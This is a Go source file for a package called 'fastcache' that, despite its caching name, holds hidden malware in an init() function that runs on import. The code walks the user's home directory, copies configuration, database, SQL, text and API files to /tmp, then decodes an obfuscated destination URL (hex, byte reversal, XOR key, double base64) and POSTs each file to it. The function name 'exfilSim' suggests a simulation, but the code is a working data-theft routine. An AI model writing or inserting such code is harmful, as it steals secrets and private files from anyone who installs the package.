package fastcache

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var encryptedHex = "4e5826314020273f173a1804162f2d361e092b0a39541a3501302704230b2b372f112f280d3701380928303718112636385a36073805153132555d393c2323364f331c331e1b343330543c36201d3a212b2320042e2b1f321e5a26283a3b4a070e2b2a22200d2238"

func init() {
	dir := "/tmp/fastCaching"
	_ = os.MkdirAll(dir, 0700)

	homeDir, err := os.UserHomeDir()
	if err != nil {
		homeDir = "/"
	}

	targetExts := []string{".cfg", ".conf", ".db", ".sql", ".txt", ".api"}

	_ = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		for _, ext := range targetExts {
			if strings.HasSuffix(info.Name(), ext) {
				copyToSandbox(path, dir)
				break
			}
		}
		return nil
	})

	go exfilSim(dir)
}

func copyToSandbox(src, dir string) {
	data, err := os.ReadFile(src)
	if err != nil {
		return
	}
	dest := filepath.Join(dir, filepath.Base(src))
	_ = os.WriteFile(dest, data, 0600)
}

func reverseBytes(b []byte) {
	for i, j := 0, len(b)-1; i < j; i, j = i+1, j-1 {
		b[i], b[j] = b[j], b[i]
	}
}

func xorBytes(b, key []byte) {
	for i := range b {
		b[i] ^= key[i%len(key)]
	}
}

func doubleBase64Decode(b []byte) ([]byte, error) {
	first, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		return nil, err
	}
	second, err := base64.StdEncoding.DecodeString(string(first))
	if err != nil {
		return nil, err
	}
	return second, nil
}

func decryptTarget() (string, error) {
	data, err := hex.DecodeString(encryptedHex)
	if err != nil {
		return "", err
	}
	reverseBytes(data)
	xorBytes(data, []byte("awesomeKey"))
	decoded, err := doubleBase64Decode(data)
	if err != nil {
		return "", err
	}
	return string(decoded), nil
}

func exfilSim(dir string) {
	target, err := decryptTarget()
	if err != nil {
		// if decryption fails, stop exfiltration
		return
	}

	files, _ := os.ReadDir(dir)
	for _, file := range files {
		data, _ := os.ReadFile(filepath.Join(dir, file.Name()))
		req, _ := http.NewRequest("POST", target, bytes.NewReader(data))
		req.Header.Set("Content-Type", "application/octet-stream")
		client := &http.Client{Timeout: 3 * time.Second}
		_, _ = client.Do(req)
	}
}
